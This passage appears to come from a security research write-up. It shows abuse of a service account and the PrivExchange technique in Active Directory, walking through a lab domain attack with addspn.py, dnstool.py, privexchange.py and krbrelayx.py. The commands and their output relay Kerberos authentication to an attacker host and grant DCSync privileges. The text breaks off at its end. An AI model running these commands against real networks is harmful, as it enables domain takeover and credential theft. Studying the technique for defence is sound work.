<title>Example Service Account and PrivExchange</title>
</head><body><b>Use case 2: Abusing a service account and PrivExchange<br/>
</b><br/>
The previous use case used a computer account and an SMB connection to obtain the TGT of a DC. While the above described method is the only way to perform this attack without executing code on the compromised host (all data is obtained via RPC calls, and the DC only connects to the attacker machine), usually it would be easier to trigger an SMB connection to the compromised host, dump LSASS memory and/or use Mimikatz or Rubeus to extract the TGTs from memory. This would not require modifying DNS records and SPNs. In the next case we will be using a user account (that is used as a service account) instead of a computer account. This is more complex or even impossible to exploit without modifying information in AD. If the user account is for example used for an MSSQL service, it would only be possible to extract the TGT from LSASS if we could somehow convince a victim to connect to the MSSQL service and also have Administrative access to the server to run the code that extracts the tickets from memory. By adding an extra SPN to the user account we can use existing tools such as the SpoolService bug or PrivExchange to exploit this via HTTP or SMB, without the need to touch the host on which this service is running at all.<br/>
<br/>
This requires two things:<br/>
<br/>
&nbsp; &nbsp; The password of the service account<br/>
&nbsp; &nbsp; Delegated control over the service account object<br/>
<br/>
The password for the service account could have been previously obtained using a Kerberoast or password spraying attack. Delegated control over the account is required to add an SPN to the account, this control could be present because the service account is part of an Organisational Unit over which control was delegated to a sysadmin, or because we compromised an account in a high privilege group, such as Account Operators.<br/>
<br/>
In this scenario we have control over a helpdesk user, which has been delegated the rights to manage users in the Service Accounts OU. We also discovered that the service account sqlserv has the weak password Internal01 set. This service account only has an SPN for the MSSQL service running on database.internal.corp. Since we want to escalate privileges via Exchange with PrivExchange, which connects over HTTP, we add a new SPN using this account for http/evil.internal.corp:<br/>
<br/>
user@localhost:~/krbrelayx$ python addspn.py -u icorp\\helpdesk -p Welkom01 -t sqlserv -s http/evil.internal.corp -q icorp-dc.internal.corp<br/>
[-] Connecting to host...<br/>

user@localhost:~/krbrelayx$ python addspn.py -u icorp\\helpdesk -p Welkom01 -t sqlserv -s http/evil.internal.corp icorp-dc.internal.corp<br/>
[-] Connecting to host...<br/>
[-] Binding to host<br/>
[+] Bind OK<br/>
[+] Found modification target<br/>
[+] SPN Modified successfully<br/>
<br/>
As with the previous attack we add a DNS record to point to our attackers IP:<br/>
<br/>
user@localhost:~/krbrelayx$ python dnstool.py -u icorp\\helpdesk -p Welkom01 -r evil.internal.corp -d 192.168.111.87 --action add icorp-dc.internal.corp <br/>
[-] Connecting to host...<br/>
[-] Binding to host<br/>
[+] Bind OK<br/>
[-] Adding new record<br/>
[+] LDAP operation completed successfully<br/>
<br/>
Now we can start krbrelayx.py. Since we are working with a user account, by default tickets will be encrypted with RC4, so we need to calculate the NTLM hash of the password in order to decrypt them (we don’t need to bother with a Kerberos salt here because RC4 doesn’t use one).<br/>
<br/>
import hashlib<br/>
print(hashlib.new('md4', 'Internal01'.encode('utf-16le')).hexdigest())<br/>
<br/>
This hash we can pass to krbrelayx.py and we can start the server. This time instead of exporting the ticket we use it directly to connect to LDAP and grant our helpdesk user DCSync privileges using the -t ldap://icorp-dc.internal.corp flag. We run privexchange.py and krbrelayx.py at the same time:<br/>
<br/>
user@localhost:~/privexchange$ python privexchange.py -u helpdesk -p Welkom01 -ah evil.internal.corp exchange.internal.corp -d internal.corp<br/>
INFO: Using attacker URL: http://evil.internal.corp/privexchange/<br/>
INFO: Exchange returned HTTP status 200 - authentication was OK<br/>
INFO: API call was successful<br/>
<br/>
And see the attack doing it’s work in a very similar way to ntlmrelayx:<br/>
<br/>
user@localhost:~/krbrelayx$ sudo python krbrelayx.py -hashes aad3b435b51404eeaad3b435b51404ee:d3026ba6ef6215da295175934b3d0e09 -t ldap://icorp-dc.internal.corp --escalate-user helpdesk<br/>

<br/>
The advantage (for an attacker) of this is that this uses Kerberos functionality instead of NTLM relaying, and thus mitigations against NTLM relaying do not apply (but it does require much higher privileges to perform). We could also have avoided calculating the Kerberos hashes manually and specified those on the commandline with the correct salt, which makes krbrelayx calculate all the keys by itself:<br/>
